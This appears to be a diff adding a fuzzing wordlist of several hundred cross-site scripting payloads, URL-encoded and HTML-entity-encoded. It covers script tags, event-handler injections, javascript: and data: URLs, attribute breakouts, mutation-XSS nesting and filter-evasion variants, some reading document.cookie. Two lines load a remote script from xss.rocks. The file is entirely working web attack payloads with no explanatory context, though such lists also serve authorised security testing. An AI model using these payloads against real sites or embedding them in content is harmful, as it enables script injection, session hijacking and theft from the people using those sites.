+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
+%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%3Cscript%3Econfirm%28document.domain%29%3C%2Fscript%3E
+%3Cscript%3Eprompt%28document.domain%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+%3Cscript%3Econfirm%28document.cookie%29%3C%2Fscript%3E
+%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28window.origin%29%3C%2Fscript%3E
+%3Cscript%3Econfirm%28window.origin%29%3C%2Fscript%3E
+%3Cscript%3Eprompt%28window.origin%29%3C%2Fscript%3E
+%3Cscript%20src%3D%2F%2Fxss.rocks%2Fxss.js%3E%3C%2Fscript%3E
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
+%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%27%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E
+%27%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
+%22%3E%3Csvg%20onload%3Dalert%281%29%3E
+%22%3E%3Csvg%20onload%3Dconfirm%281%29%3E
+%22%3E%3Csvg%20onload%3Dprompt%281%29%3E
+%27%3E%3Csvg%20onload%3Dalert%281%29%3E
+%27%3E%3Csvg%20onload%3Dconfirm%281%29%3E
+%27%3E%3Csvg%20onload%3Dprompt%281%29%3E
+%22%3E%3Cvideo%20src%3Dx%20onerror%3Dalert%281%29%3E
+%22%3E%3Cvideo%20src%3Dx%20onerror%3Dconfirm%281%29%3E
+%22%3E%3Cvideo%20src%3Dx%20onerror%3Dprompt%281%29%3E
+%22%3E%3Caudio%20src%3Dx%20onerror%3Dalert%281%29%3E
+%22%3E%3Caudio%20src%3Dx%20onerror%3Dconfirm%281%29%3E
+%22%3E%3Caudio%20src%3Dx%20onerror%3Dprompt%281%29%3E
+%22%3E%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E
+%22%3E%3Cdetails%20open%20ontoggle%3Dconfirm%281%29%3E
+%22%3E%3Cdetails%20open%20ontoggle%3Dprompt%281%29%3E
+%22%3E%3Cmarquee%20onstart%3Dalert%281%29%3E
+%22%3E%3Cmarquee%20onstart%3Dconfirm%281%29%3E
+%22%3E%3Cmarquee%20onstart%3Dprompt%281%29%3E
+%22%3E%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+%22%3E%3Ciframe%20srcdoc%3D%22%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%22%3E
+%22%3E%3Ciframe%20srcdoc%3D%22%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%22%3E
+%3C%2Ftitle%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3C%2Ftitle%3E%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
+%3C%2Ftitle%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+%3C%2Ftextarea%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3C%2Ftextarea%3E%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
+%3C%2Ftextarea%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+%3C%2Fstyle%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3C%2Fstyle%3E%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
+%3C%2Fstyle%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3C%2Fscript%3E%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
+%3C%2Fscript%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+%3C%2Ftextarea%3E%3Csvg%20onload%3Dalert%281%29%3E
+%3C%2Ftextarea%3E%3Csvg%20onload%3Dconfirm%281%29%3E
+%3C%2Ftextarea%3E%3Csvg%20onload%3Dprompt%281%29%3E
+%3C%2Ftextarea%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%3C%2Ftextarea%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E
+%3C%2Ftextarea%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%2F%2F
+%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E
+%3Cimg%2Fsrc%3Dx%2Fonerror%3Dprompt%281%29%3E
+%3Csvg%2Fonload%3Dalert%281%29%3E
+%3Csvg%2Fonload%3Dconfirm%281%29%3E
+%3Csvg%2Fonload%3Dprompt%281%29%3E
+%3Csvg%20onload%3D%22alert%281%29%22%3E
+%3Csvg%20onload%3D%27confirm%281%29%27%3E
+%3Csvg%20onload%3Dprompt%281%29%2F%2F
+%3Csvg%2Fonload%3Dalert%601%60%3E
+%3Csvg%2Fonload%3Dconfirm%601%60%3E
+%3Csvg%2Fonload%3Dprompt%601%60%3E
+%3Ca%20href%3Djavascript%3Aalert%281%29%3Ex%3C%2Fa%3E
+%3Ca%20href%3Djavascript%3Aconfirm%281%29%3Ex%3C%2Fa%3E
+%3Ca%20href%3Djavascript%3Aprompt%281%29%3Ex%3C%2Fa%3E
+%3Ca%20href%3D%22%20%20javascript%3Aalert%281%29%22%3Ex%3C%2Fa%3E
+%3Ca%20href%3D%22%20%09javascript%3Aconfirm%281%29%22%3Ex%3C%2Fa%3E
+%3Ca%20href%3D%22JaVaScRiPt%3Aprompt%281%29%22%3Ex%3C%2Fa%3E
+%3Ca%20href%3D%22java%26%23115%3Bcript%3Aalert%281%29%22%3Ex%3C%2Fa%3E
+%3Ca%20href%3D%22java%26%23x09%3Bscript%3Aconfirm%281%29%22%3Ex%3C%2Fa%3E
+%3Ca%20href%3D%22%5Cx6a%5Cx61%5Cx76%5Cx61%5Cx73%5Cx63%5Cx72%5Cx69%5Cx70%5Cx74%3Aprompt%281%29%22%3Ex%3C%2Fa%3E
+%3Cform%3E%3Cbutton%20formaction%3Djavascript%3Aalert%281%29%3Ex%3C%2Fbutton%3E%3C%2Fform%3E
+%3Cform%3E%3Cbutton%20formaction%3Djavascript%3Aconfirm%281%29%3Ex%3C%2Fbutton%3E%3C%2Fform%3E
+%3Cform%3E%3Cbutton%20formaction%3Djavascript%3Aprompt%281%29%3Ex%3C%2Fbutton%3E%3C%2Fform%3E
+%3Ciframe%20src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5jb25maXJtKDEpPC9zY3JpcHQ%2B%22%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4%3D%22%3E%3C%2Fiframe%3E
+%3Cx%20onmouseover%3Dalert%281%29%3Ehover
+%3Cx%20onmouseenter%3Dconfirm%281%29%3Ehover
+%3Cx%20onpointerover%3Dprompt%281%29%3Ehover
+%3Cx%20onclick%3Dalert%281%29%3Eclick
+%3Cx%20ondblclick%3Dconfirm%281%29%3Eclick
+%3Cx%20onpointerdown%3Dprompt%281%29%3Eclick
+%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E
+%3Cinput%20onfocus%3Dconfirm%281%29%20autofocus%3E
+%3Cinput%20onfocus%3Dprompt%281%29%20autofocus%3E
+callback%3Dalert%281%29%2F%2F
+callback%3Dconfirm%281%29%3B
+callback%3Dprompt%281%29%2F%2F
+%7D%29%28alert%281%29%29%2F%2F
+%7D%29%28confirm%281%29%29%2F%2F
+%7D%29%28prompt%281%29%29%2F%2F
+%24%7Balert%281%29%7D
+%24%7Bconfirm%281%29%7D
+%24%7Bprompt%281%29%7D
+Function%60alert%5Cx28document.domain%5Cx29%60%28%29
+Function%60confirm%5Cx28document.domain%5Cx29%60%28%29
+Function%60prompt%5Cx28document.domain%5Cx29%60%28%29
+%5B%5D.constructor.constructor%28%27alert%281%29%27%29%28%29
+%5B%5D.constructor.constructor%28%27confirm%281%29%27%29%28%29
+%5B%5D.constructor.constructor%28%27prompt%281%29%27%29%28%29
+eval%28atob%28%27YWxlcnQoMSk%3D%27%29%29
+eval%28atob%28%27Y29uZmlybSgxKQ%3D%3D%27%29%29
+eval%28atob%28%27cHJvbXB0KDEp%27%29%29
+eval%28%27%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%28%5Cx31%29%27%29
+eval%28%27%5Cx63%5Cx6f%5Cx6e%5Cx66%5Cx69%5Cx72%5Cx6d%28%5Cx31%29%27%29
+eval%28%27%5Cx70%5Cx72%5Cx6f%5Cx6d%5Cx70%5Cx74%28%5Cx31%29%27%29
+%3Csvg%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%2Fsvg%3E
+%3Csvg%3E%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%3C%2Fsvg%3E
+%3Csvg%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%3C%2Fsvg%3E
+%3Csvg%3E%3Canimate%20onbegin%3Dalert%281%29%20attributeName%3Dx%20dur%3D1s%3E
+%3Csvg%3E%3Canimate%20onbegin%3Dconfirm%281%29%20attributeName%3Dx%20dur%3D1s%3E
+%3Csvg%3E%3Canimate%20onbegin%3Dprompt%281%29%20attributeName%3Dx%20dur%3D1s%3E
+%3Csvg%3E%3Cset%20onbegin%3Dalert%281%29%20attributeName%3Dx%20to%3D1%3E
+%3Csvg%3E%3Cset%20onbegin%3Dconfirm%281%29%20attributeName%3Dx%20to%3D1%3E
+%3Csvg%3E%3Cset%20onbegin%3Dprompt%281%29%20attributeName%3Dx%20to%3D1%3E
+%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C%21--%3C%2Fstyle%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C%21--%3C%2Fstyle%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E
+%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C%21--%3C%2Fstyle%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
+%3C%21--%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E--%3E
+%3C%21--%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E--%3E
+%3C%21--%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E--%3E
+--%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+--%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E
+--%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
+%3Cmeta%20http-equiv%3Drefresh%20content%3D%220%3Burl%3Djavascript%3Aalert%281%29%22%3E
+%3Cmeta%20http-equiv%3Drefresh%20content%3D%220%3Burl%3Djavascript%3Aconfirm%281%29%22%3E
+%3Cmeta%20http-equiv%3Drefresh%20content%3D%220%3Burl%3Djavascript%3Aprompt%281%29%22%3E
+%3Cstyle%3E%40import%27javascript%3Aalert%281%29%27%3B%3C%2Fstyle%3E
+%3Cstyle%3E%40import%27javascript%3Aconfirm%281%29%27%3B%3C%2Fstyle%3E
+%3Cstyle%3E%40import%27javascript%3Aprompt%281%29%27%3B%3C%2Fstyle%3E
+%3Cdiv%20style%3D%22width%3Aexpression%28alert%281%29%29%22%3Ex%3C%2Fdiv%3E
+%3Cdiv%20style%3D%22width%3Aexpression%28confirm%281%29%29%22%3Ex%3C%2Fdiv%3E
+%3Cdiv%20style%3D%22width%3Aexpression%28prompt%281%29%29%22%3Ex%3C%2Fdiv%3E
+%22%20onmouseover%3Dalert%281%29%20x%3D%22
+%22%20onmouseover%3Dconfirm%281%29%20x%3D%22
+%22%20onmouseover%3Dprompt%281%29%20x%3D%22
+%27%20onmouseover%3Dalert%281%29%20x%3D%27
+%27%20onmouseover%3Dconfirm%281%29%20x%3D%27
+%27%20onmouseover%3Dprompt%281%29%20x%3D%27
+%22%20autofocus%20onfocus%3Dalert%281%29%20x%3D%22
+%22%20autofocus%20onfocus%3Dconfirm%281%29%20x%3D%22
+%22%20autofocus%20onfocus%3Dprompt%281%29%20x%3D%22
+%22%20onclick%3Dalert%281%29%20x%3D%22
+%22%20onclick%3Dconfirm%281%29%20x%3D%22
+%22%20onclick%3Dprompt%281%29%20x%3D%22
+%3Csvg%3E%3Cp%3E%3Cstyle%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%3C%2Fstyle%3E%3C%2Fp%3E%3C%2Fsvg%3E
+%3Csvg%3E%3Cp%3E%3Cstyle%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E%3C%2Fstyle%3E%3C%2Fp%3E%3C%2Fsvg%3E
+%3Csvg%3E%3Cp%3E%3Cstyle%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E%3C%2Fstyle%3E%3C%2Fp%3E%3C%2Fsvg%3E
+%3Cnoscript%3E%3Cp%20title%3D%22%3C%2Fnoscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%22%3E
+%3Cnoscript%3E%3Cp%20title%3D%22%3C%2Fnoscript%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E%22%3E
+%3Cnoscript%3E%3Cp%20title%3D%22%3C%2Fnoscript%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E%22%3E
+%3Ctemplate%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%3C%2Ftemplate%3E
+%3Ctemplate%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E%3C%2Ftemplate%3E
+%3Ctemplate%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E%3C%2Ftemplate%3E
+%3Cnoembed%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%3C%2Fnoembed%3E
+%3Cnoembed%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E%3C%2Fnoembed%3E
+%3Cnoembed%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E%3C%2Fnoembed%3E
+%3Cnoframes%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%3C%2Fnoframes%3E
+%3Cnoframes%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E%3C%2Fnoframes%3E
+%3Cnoframes%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E%3C%2Fnoframes%3E
+%3Cxss%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert%281%29%3E%3C%2Fxss%3E
+%3Cxss%20id%3Dx%20tabindex%3D1%20onfocus%3Dconfirm%281%29%3E%3C%2Fxss%3E
+%3Cxss%20id%3Dx%20tabindex%3D1%20onfocus%3Dprompt%281%29%3E%3C%2Fxss%3E
+%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E
+%3Cvideo%3E%3Csource%20onerror%3Dconfirm%281%29%3E%3C%2Fvideo%3E
+%3Cvideo%3E%3Csource%20onerror%3Dprompt%281%29%3E%3C%2Fvideo%3E
+%3Cobject%20data%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fobject%3E
+%3Cobject%20data%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%22%3E%3C%2Fobject%3E
+%3Cobject%20data%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%22%3E%3C%2Fobject%3E
+%3Cembed%20src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E
+%3Cembed%20src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Econfirm%281%29%3C%2Fscript%3E%22%3E
+%3Cembed%20src%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Eprompt%281%29%3C%2Fscript%3E%22%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Econfirm%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Eprompt%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscript%3Eal%5Cu0065rt%281%29%3C%2Fscript%3E
+%3Cscript%3Econ%5Cu0066irm%281%29%3C%2Fscript%3E
+%3Cscript%3Epro%5Cu006Dpt%281%29%3C%2Fscript%3E
+%3Cscript%3Ewindow%5B%27al%27%252B%27ert%27%5D%281%29%3C%2Fscript%3E
+%3Cscript%3Ewindow%5B%27con%27%252B%27firm%27%5D%281%29%3C%2Fscript%3E
+%3Cscript%3Ewindow%5B%27pro%27%252B%27mpt%27%5D%281%29%3C%2Fscript%3E
+%3Cimg%20src%3Dx%20onerror%3DglobalThis%5B%27alert%27%5D%281%29%3E
+%3Cimg%20src%3Dx%20onerror%3DglobalThis%5B%27confirm%27%5D%281%29%3E
+%3Cimg%20src%3Dx%20onerror%3DglobalThis%5B%27prompt%27%5D%281%29%3E
+%3Cimg%20src%3Dx%20style%3Dx%3Aexpression%28alert%281%29%29%3E
+%3Cimg%20src%3Dx%20style%3Dx%3Aexpression%28confirm%281%29%29%3E
+%3Cimg%20src%3Dx%20style%3Dx%3Aexpression%28prompt%281%29%29%3E
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#111;&#114;&#105;&#103;&#105;&#110;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#111;&#114;&#105;&#103;&#105;&#110;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#111;&#114;&#105;&#103;&#105;&#110;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#115;&#114;&#99;&#61;&#47;&#47;&#120;&#115;&#115;&#46;&#114;&#111;&#99;&#107;&#115;&#47;&#120;&#115;&#115;&#46;&#106;&#115;&#62;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#34;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#39;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#39;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#39;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#39;&#62;&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#39;&#62;&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#39;&#62;&#60;&#115;&#118;&#103;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#118;&#105;&#100;&#101;&#111;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#118;&#105;&#100;&#101;&#111;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#118;&#105;&#100;&#101;&#111;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#97;&#117;&#100;&#105;&#111;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#97;&#117;&#100;&#105;&#111;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#97;&#117;&#100;&#105;&#111;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#100;&#101;&#116;&#97;&#105;&#108;&#115;&#32;&#111;&#112;&#101;&#110;&#32;&#111;&#110;&#116;&#111;&#103;&#103;&#108;&#101;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#100;&#101;&#116;&#97;&#105;&#108;&#115;&#32;&#111;&#112;&#101;&#110;&#32;&#111;&#110;&#116;&#111;&#103;&#103;&#108;&#101;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#100;&#101;&#116;&#97;&#105;&#108;&#115;&#32;&#111;&#112;&#101;&#110;&#32;&#111;&#110;&#116;&#111;&#103;&#103;&#108;&#101;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#109;&#97;&#114;&#113;&#117;&#101;&#101;&#32;&#111;&#110;&#115;&#116;&#97;&#114;&#116;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#109;&#97;&#114;&#113;&#117;&#101;&#101;&#32;&#111;&#110;&#115;&#116;&#97;&#114;&#116;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#109;&#97;&#114;&#113;&#117;&#101;&#101;&#32;&#111;&#110;&#115;&#116;&#97;&#114;&#116;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;
+&#34;&#62;&#60;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#100;&#111;&#99;&#61;&#34;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;
+&#34;&#62;&#60;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#100;&#111;&#99;&#61;&#34;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;
+&#34;&#62;&#60;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#100;&#111;&#99;&#61;&#34;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;
+&#60;&#47;&#116;&#105;&#116;&#108;&#101;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
